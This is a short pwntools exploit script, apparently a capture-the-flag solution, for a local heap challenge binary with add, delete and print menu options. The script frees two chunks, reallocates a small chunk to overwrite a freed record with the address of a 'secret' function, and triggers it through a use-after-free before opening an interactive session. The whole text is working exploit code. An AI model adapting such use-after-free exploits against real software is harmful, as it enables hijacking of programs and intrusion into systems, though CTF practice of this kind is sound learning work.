from pwn import *

context.os='linux'
context.arch='amd64'
r=process('./pwn')
elf=ELF('pwn')

def addS(size,content):
	r.sendlineafter("Your choice:","1")
	r.sendlineafter("the size of servant's name :",str(size))
	r.sendlineafter("ability :",content)
def deleteS(index):
	r.sendlineafter("Your choice:","2")
	r.sendlineafter("Index :",str(index))
def printS(index):
	r.sendlineafter("Your choice:","3")
	r.sendlineafter("Index :",str(index))

addS(0x60,'0000')	#0 chunk_s:1 ; chunk_b:2
addS(0x60,'1111')	#1 chunk_s:3 ; chunk_b:4
deleteS(0)		#
deleteS(1)		#chunk_s bins 3->1 ; chunk_b bins 4->2 .
addS(0x8,p32(elf.symbols['secret'])+'\x00'*4)
printS(0)
r.interactive()
